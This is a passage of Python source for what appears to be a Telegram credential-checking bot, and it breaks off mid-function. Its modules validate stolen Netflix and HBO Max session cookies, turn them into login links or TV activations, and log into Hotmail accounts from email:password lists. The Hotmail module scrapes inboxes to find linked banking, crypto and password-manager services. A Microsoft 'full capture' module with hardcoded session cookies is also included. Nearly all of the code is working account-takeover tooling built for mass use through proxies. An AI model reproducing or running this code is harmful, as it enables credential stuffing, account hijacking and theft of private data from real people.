        f"{SP_DEAD}   <b>Dead    :</b>  <code>{dead}</code>\n\n"
        f"{E_CLOCK}   <b>Time    :</b>  <code>{elapsed:.1f}s</code>\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


def nf_build_export(r: dict, idx: int) -> str:
    lines = [f"========== NETFLIX HIT #{idx} =========="]
    for key, lbl in [("name","Name"),("email","Email"),("country","Country"),
                     ("plan","Plan"),("plan_price","Price"),("member_since","Member Since"),
                     ("next_billing","Next Billing"),("payment_method","Payment"),
                     ("masked_card","Card"),("quality","Quality"),("streams","Streams"),
                     ("extra_member","Extra Member"),("email_verified","Email Verified"),
                     ("membership_status","Status"),("profiles","Profiles"),("guid","GUID")]:
        lines.append(f"{lbl}: {r.get(key,'Unknown')}")
    lines.append("\nNetscape Cookie ↓\n" + r.get("content", ""))
    return "\n".join(lines)


def nf_build_token_export(r: dict, idx: int) -> str:
    tok = r.get("token", "N/A")
    return (f"========== NF TOKEN #{idx} ==========\n"
            f"Token  : {tok}\n"
            f"Expires: {r.get('expires','N/A')}\n\n"
            f"Phone  : https://www.netflix.com/unsupported?nftoken={tok}\n"
            f"Desktop: https://www.netflix.com/browse?nftoken={tok}\n"
            f"TV     : https://www.netflix.com/tv8?nftoken={tok}")


# ▼ CHUNK 3 END — PASTE CHUNK 4 BELOW THIS LINE ▼
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    HBO MAX CHECKER & TV ACTIVATOR                       ║
# ╚══════════════════════════════════════════════════════════════════════════╝

HBO_ENDPOINTS = {
    "amer":  {"validate": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/validate",
              "connect":  "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/connect"},
    "emea":  {"validate": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/validate",
              "connect":  "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/connect"},
    "latam": {"validate": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/validate",
              "connect":  "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/connect"},
    "apac":  {"validate": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/validate",
              "connect":  "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/connect"},
}

HBO_COUNTRY_CODES = {
    "TR": "Turkey 🇹🇷",         "US": "United States 🇺🇸", "IN": "India 🇮🇳",
    "GB": "United Kingdom 🇬🇧", "FR": "France 🇫🇷",        "DE": "Germany 🇩🇪",
    "ES": "Spain 🇪🇸",          "IT": "Italy 🇮🇹",          "BR": "Brazil 🇧🇷",
    "MX": "Mexico 🇲🇽",         "AR": "Argentina 🇦🇷",      "CA": "Canada 🇨🇦",
    "AU": "Australia 🇦🇺",      "JP": "Japan 🇯🇵",          "KR": "South Korea 🇰🇷",
    "TH": "Thailand 🇹🇭",       "PL": "Poland 🇵🇱",
}


def hbo_decode_jwt(token: str) -> Optional[Dict]:
    try:
        parts = token.split(".")
        if len(parts) >= 2:
            payload = parts[1] + "=" * (4 - len(parts[1]) % 4)
            return json.loads(base64.b64decode(payload))
        return None
    except Exception:
        return None


def hbo_extract_st_token(content: str) -> Optional[str]:
    m = re.search(r"^st:\s*(eyJ[A-Za-z0-9_\-\.]+)", content, re.MULTILINE)
    if m:
        return m.group(1)
    m = re.search(r"st=([^;\s]+)", content)
    if m and len(m.group(1).split(".")) == 3:
        return m.group(1)
    m = re.search(r"(eyJ[A-Za-z0-9_\-\.]+)", content)
    if m and len(m.group(1).split(".")) == 3:
        return m.group(1)
    return None


def hbo_get_region(st_token: str) -> str:
    decoded = hbo_decode_jwt(st_token)
    if decoded:
        sub = decoded.get("subdivision", "")
        for region in ("amer", "emea", "latam", "apac"):
            if region in sub:
                return region
    return "amer"


def hbo_get_user_info(st_token: str, region: str) -> Optional[Dict]:
    url = f"https://default.beam-{region}.prd.api.hbomax.com/users/me"
    headers = {
        "accept": "*/*", "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://play.hbomax.com",
        "referer": "https://play.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": "realm=bolt,bid=beam,features=ar",
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
    }
    try:
        r = requests.get(url, headers=headers, timeout=20, verify=False)
        return r.json() if r.status_code == 200 else None
    except Exception:
        return None


def hbo_validate(st_token: str, region: str):
    data = hbo_get_user_info(st_token, region)
    if not data:
        return False, None, None
    attrs = data.get("data", {}).get("attributes", {})
    if not attrs:
        return False, None, None
    email = attrs.get("username", "Unknown")
    if email and "@" not in email:
        email = f"{email}@hbomax.com"
    country = attrs.get("verifiedHomeTerritory", "Unknown")
    country = HBO_COUNTRY_CODES.get(country, country)
    return True, email, country


def hbo_generate_device_info() -> str:
    info = {
        "deviceId": str(uuid.uuid4()), "deviceName": "Chrome",
        "deviceModel": "Windows", "deviceType": "BROWSER",
        "osVersion": "10.0.0", "appVersion": "7.4.0",
        "manufacturer": "Google", "screenWidth": 1920,
        "screenHeight": 1080, "language": "en-US",
        "timezone": "America/New_York",
    }
    return base64.b64encode(json.dumps(info).encode()).decode()


def hbo_activate_tv(st_token: str, tv_code: str, region: str) -> tuple:
    headers = {
        "accept": "*/*", "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://auth.hbomax.com",
        "referer": "https://auth.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": f"realm=bolt,bid=beam,features=ar,clientId=web_{uuid.uuid4().hex[:16]}",
        "x-disco-device-info": hbo_generate_device_info(),
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
        "x-wbd-ace": "MjAyNi0wNi0xMVQxOTowNzo1M1p8VVMtQ0F8U0x8MVlOTg==",
        "x-wbd-device-consent": "gpc=0",
        "x-wbd-preferred-language": "en-US,en",
        "x-wbd-time-zone": "Asia/Calcutta",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
    }
    payload = {"linkingCode": tv_code}
    try:
        r1 = requests.post(HBO_ENDPOINTS[region]["validate"],
                           headers=headers, json=payload, timeout=20, verify=False)
        if r1.status_code in (200, 204):
            r2 = requests.post(HBO_ENDPOINTS[region]["connect"],
                               headers=headers, json=payload, timeout=20, verify=False)
            return (True, "success") if r2.status_code in (200, 204) else (False, "activation_failed")
        if r1.status_code == 400:
            for err in r1.json().get("errors", []):
                code = err.get("code", "")
                if code == "invalid.code":
                    return False, "invalid_code"
                if code == "expired.code":
                    return False, "expired_code"
        return False, "unknown_error"
    except Exception as e:
        return False, f"exception: {str(e)[:60]}"


def hbo_check_file(filepath: str) -> Dict:
    fname = os.path.basename(filepath)
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as fh:
            content = fh.read()
        st_token = hbo_extract_st_token(content)
        if not st_token:
            return {"status": "DEAD", "reason": "No st token found",
                    "filename": fname, "content": content}
        decoded = hbo_decode_jwt(st_token)
        if decoded:
            exp = decoded.get("exp", 0)
            if exp and datetime.fromtimestamp(exp) < datetime.now():
                return {"status": "DEAD", "reason": "Token expired (JWT)",
                        "filename": fname, "content": content, "st_token": st_token}
        region = hbo_get_region(st_token)
        valid, email, country = hbo_validate(st_token, region)
        if valid:
            return {"status": "LIVE", "email": email, "country": country,
                    "region": region, "st_token": st_token,
                    "filename": fname, "content": content}
        return {"status": "DEAD", "reason": "Account invalid / no subscription",
                "filename": fname, "content": content, "st_token": st_token}
    except Exception as e:
        return {"status": "DEAD", "reason": str(e)[:80], "filename": fname, "content": ""}


def hbo_fmt_single(r: dict) -> str:
    if r["status"] == "LIVE":
        return (
            f"╔══════════════════════════════╗\n"
            f"║  {HBO_LIVE} <b>HBO Max — LIVE</b>           ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
            f"{E_COUNTRY}  <b>Country :</b> <code>{r.get('country','Unknown')}</code>\n"
            f"{E_PLAN}  <b>Region  :</b> <code>{r.get('region','?').upper()}</code>\n\n"
            f"<i>Tap {HBO_TV} Activate TV to log in a device.</i>"
        )
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {HBO_DEAD} <b>HBO Max — DEAD</b>          ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n"
        f"{HBO_DEAD}  <b>Reason :</b> <code>{r.get('reason','Invalid')}</code>"
    )


def hbo_fmt_summary(total: int, live: int, dead: int, elapsed: float) -> str:
    pct = f"{live / total * 100:.1f}" if total else "0.0"
    return (
        f"{HBO_ICON} <b>HBO Max Results</b>\n\n"
        f"{E_COUNT}  Checked : <b>{total}</b>\n"
        f"{HBO_LIVE}  Live    : <b>{live}</b>  ({pct}%)\n"
        f"{HBO_DEAD}  Dead    : <b>{dead}</b>\n\n"
        f"{E_CLOCK}  Time    : <code>{elapsed:.1f}s</code>\n\n"
        f"{E_ZIP} Click <b>Results ZIP</b> to download live cookies."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    HOTMAIL INBOX CHECKER (verified)                     ║
# ╚══════════════════════════════════════════════════════════════════════════╝

HM_SERVICES = {
    "Facebook":   "security@facebookmail.com",
    "Instagram":  "security@mail.instagram.com",
    "TikTok":     "register@account.tiktok.com",
    "Twitter":    "info@x.com",
    "LinkedIn":   "security-noreply@linkedin.com",
    "Reddit":     "noreply@reddit.com",
    "Snapchat":   "no-reply@accounts.snapchat.com",
    "Discord":    "noreply@discord.com",
    "Telegram":   "telegram.org",
    "Netflix":    "info@account.netflix.com",
    "Spotify":    "no-reply@spotify.com",
    "Twitch":     "no-reply@twitch.tv",
    "YouTube":    "no-reply@youtube.com",
    "Disney+":    "no-reply@disneyplus.com",
    "Hulu":       "account@hulu.com",
    "HBO Max":    "no-reply@hbomax.com",
    "Amazon Prime":"auto-confirm@amazon.com",
    "Crunchyroll":"noreply@crunchyroll.com",
    "Amazon":     "auto-confirm@amazon.com",
    "eBay":       "newuser@nuwelcome.ebay.com",
    "Shopify":    "no-reply@shopify.com",
    "Etsy":       "transaction@etsy.com",
    "AliExpress": "no-reply@aliexpress.com",
    "PayPal":     "service@paypal.com.br",
    "Binance":    "do-not-reply@ses.binance.com",
    "Coinbase":   "no-reply@coinbase.com",
    "Revolut":    "no-reply@revolut.com",
    "Stripe":     "no-reply@stripe.com",
    "Steam":      "noreply@steampowered.com",
    "Xbox":       "xboxreps@engage.xbox.com",
    "PlayStation":"reply@txn-email.playstation.com",
    "EpicGames":  "help@acct.epicgames.com",
    "Roblox":     "accounts@roblox.com",
    "Minecraft":  "noreply@mojang.com",
    "Riot Games": "no-reply@riotgames.com",
    "Google":     "no-reply@accounts.google.com",
    "Microsoft":  "account-security-noreply@accountprotection.microsoft.com",
    "Apple":      "no-reply@apple.com",
    "Yahoo":      "info@yahoo.com",
    "GitHub":     "noreply@github.com",
    "Dropbox":    "no-reply@dropbox.com",
    "Zoom":       "no-reply@zoom.us",
    "Slack":      "no-reply@slack.com",
    "Notion":     "no-reply@notion.so",
    "LastPass":   "no-reply@lastpass.com",
    "1Password":  "no-reply@1password.com",
    "Dashlane":   "no-reply@dashlane.com",
    "NordVPN":    "no-reply@nordvpn.com",
    "ExpressVPN": "no-reply@expressvpn.com",
    "Surfshark":  "no-reply@surfshark.com",
    "ProtonMail": "no-reply@protonmail.com",
    "Airbnb":     "no-reply@airbnb.com",
    "Booking.com":"no-reply@booking.com",
    "Uber":       "no-reply@uber.com",
    "DoorDash":   "no-reply@doordash.com",
    "Zomato":     "no-reply@zomato.com",
    "Swiggy":     "no-reply@swiggy.com",
    "OnlyFans":   "noreply@onlyfans.com",
    "Patreon":    "no-reply@patreon.com",
    "Tinder":     "no-reply@tinder.com",
    "Fiverr":     "no-reply@fiverr.com",
    "Upwork":     "no-reply@upwork.com",
}


def hm_get_flag(country_name: str) -> str:
    try:
        import pycountry
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except Exception:
        _fb = {
            "united states": "🇺🇸", "usa": "🇺🇸", "us": "🇺🇸",
            "united kingdom": "🇬🇧", "uk": "🇬🇧", "gb": "🇬🇧",
            "india": "🇮🇳", "in": "🇮🇳",
            "canada": "🇨🇦", "ca": "🇨🇦",
            "australia": "🇦🇺", "au": "🇦🇺",
            "germany": "🇩🇪", "de": "🇩🇪",
            "france": "🇫🇷", "fr": "🇫🇷",
            "brazil": "🇧🇷", "br": "🇧🇷",
            "japan": "🇯🇵", "jp": "🇯🇵",
            "turkey": "🇹🇷", "tr": "🇹🇷",
        }
        return _fb.get(str(country_name).lower().strip(), "🏳")


def hm_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    """Hotmail login + inbox scrape. Verified identical to source."""
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    try:
        # Step 1: OAuth authorize
        url2 = (
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            f"?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code"
            f"&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        headers2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
        }
        r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
        if r2.status_code != 200:
            return {"status": "DEAD", "reason": f"auth_page_http_{r2.status_code}",
                    "email": email, "password": password}

        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return {"status": "DEAD", "reason": "ppft_extract_fail",
                    "email": email, "password": password}
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)

        # Step 2: POST credentials
        login_data = (
            f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition="
            f"&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType="
            f"&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}"
            f"&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
            f"&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        )
        headers3 = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://login.live.com",
            "Referer": r2.url,
        }
        r3 = session.post(post_url, data=login_data, headers=headers3,
                          allow_redirects=False, timeout=15)
        response_text = r3.text.lower()

        if "identity/confirm" in response_text or "consent" in response_text:
            return {"status": "DEAD", "reason": "2FA required",
                    "email": email, "password": password}

        location = r3.headers.get("Location", "")
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "DEAD", "reason": "no_auth_code",
                    "email": email, "password": password}
        code = code_match.group(1)

        # Step 3: Exchange code for token
        token_data = (
            f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            f"&grant_type=authorization_code&code={code}"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        )
        r4 = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=token_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15,
        )
        if r4.status_code != 200:
            return {"status": "DEAD", "reason": f"token_http_{r4.status_code}",
                    "email": email, "password": password}
        token_json = r4.json()
        access_token = token_json.get("access_token")
        if not access_token:
            return {"status": "DEAD", "reason": "no_access_token",
                    "email": email, "password": password}

        cid = session.cookies.get("MSPCID", "")
        if not cid:
            return {"status": "DEAD", "reason": "no_cid",
                    "email": email, "password": password}
        cid = cid.upper()

        # Step 4: Profile
        prof_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache", "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
        }
        try:
            prof = requests.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=prof_headers, timeout=30,
            ).json()
            name = prof.get("names", [{}])[0].get("displayName", "Unknown")
            country = prof.get("accounts", [{}])[0].get("location", "Unknown")
        except Exception:
            name, country = "Unknown", "Unknown"

        # Step 5: Inbox scrape
        inbox_headers = {
            "Host": "outlook.live.com", "content-length": "0",
            "x-owa-sessionid": cid, "x-req-source": "Mini",
            "authorization": f"Bearer {access_token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36",
            "action": "StartupData", "x-owa-correlationid": cid,
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*", "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "referer": "https://outlook.live.com/",
        }
        try:
            inbox_html = requests.post(
                f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                headers=inbox_headers, data="", timeout=30,
            ).text
        except Exception:
            inbox_html = ""

        # Step 6: Detect linked services
        linked = []
        for svc_name, sender in HM_SERVICES.items():
            if sender in inbox_html:
                linked.append(svc_name)

        flag = hm_get_flag(country) if country != "Unknown" else "🏳"
        country_with_flag = f"{flag} {country}" if flag != "🏳" else country

        content = (
            f"Email -- {email}\n"
            f"Password -- {password}\n"
            f"Name -- {name}\n"
            f"Country -- {country_with_flag}\n"
            f"Linked-- {', '.join(linked) if linked else 'None'}"
        )

        return {
            "status":            "HIT",
            "email":             email,
            "password":          password,
            "name":              name,
            "country":           country_with_flag,
            "linked_services":   linked,
            "content":           content,
        }

    except requests.exceptions.Timeout:
        return {"status": "DEAD", "reason": "timeout", "email": email, "password": password}
    except Exception as e:
        return {"status": "DEAD", "reason": str(e)[:60], "email": email, "password": password}


def hm_fmt_hit(r: dict) -> str:
    linked = r.get("linked_services", [])
    linked_text = ", ".join(linked) if linked else "None"
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {HM_HIT} <b>HOTMAIL HIT</b>             ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password :</b> <code>{r.get('password','?')}</code>\n"
        f"{HS_USER}  <b>Name     :</b> <code>{r.get('name','Unknown')}</code>\n"
        f"{E_COUNTRY}  <b>Country  :</b> <code>{r.get('country','Unknown')}</code>\n"
        f"{HM_LINKED}  <b>Linked   :</b> <code>{linked_text}</code>"
    )


def hm_fmt_progress(done: int, total: int, hits: int, dead: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Hotmail Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{HM_HIT} Hits : <b>{hits}</b>\n"
        f"{SS_DEAD} Dead : <b>{dead}</b>"
    )


def hm_fmt_summary(total: int, hits: int, dead: int, elapsed: float) -> str:
    pct = f"{hits / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Hotmail Check Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total  : <b>{total}</b>\n"
        f"{HM_HIT} Hits   : <b>{hits}</b>  (<i>{pct}%</i>)\n"
        f"{SS_DEAD} Dead   : <b>{dead}</b>\n"
        f"{E_CLOCK} Time   : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    MICROSOFT FULL CAPTURE — FIXED                       ║
# ║  BUG FIX: full Cookie header restored, _quote() on login/passwd removed ║
# ╚══════════════════════════════════════════════════════════════════════════╝

MSFC_PPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
MSFC_BK = "1665024852"
MSFC_UAID = "a5b22c26bc704002ac309462e8d061bb"

# Full cookie header — preserved byte-for-byte from source
MSFC_COOKIE = "CAW=%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E;DIDC=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;DIDCL=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89; OParams=11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$; MicrosoftApplicationsTelemetryDeviceId=49a10983-52d4-43ed-9a94-14ac360a5683; ai_session=K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878; MSFPC=GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"


def msfc_extract(source: str, left: str, right: str) -> str:
    try:
        idx = source.find(left)
        if idx < 0:
            return ""
        idx += len(left)
        end = source.find(right, idx)
        if end < 0:
            return ""
        return source[idx:end]
    except Exception:
        return ""


def msfc_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    """
    Full Microsoft capture — Cookie header + raw credentials (FIXED).
    Matches source byte-for-byte in login flow.
    """
    variables = {"USER": email, "PASS": password}
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    try:
        url_login = (
            f"https://login.live.com/ppsecure/post.srf"
            f"?client_id=0000000048170EF2"
            f"&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
            f"&response_type=token"
            f"&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
            f"&display=touch&username={_quote(email)}"
            f"&contextid=2CCDB02DC526CA71&bk={MSFC_BK}&uaid={MSFC_UAID}&pid=15216"
        )

        # FIX #1: raw login/passwd — no _quote() (matches source)
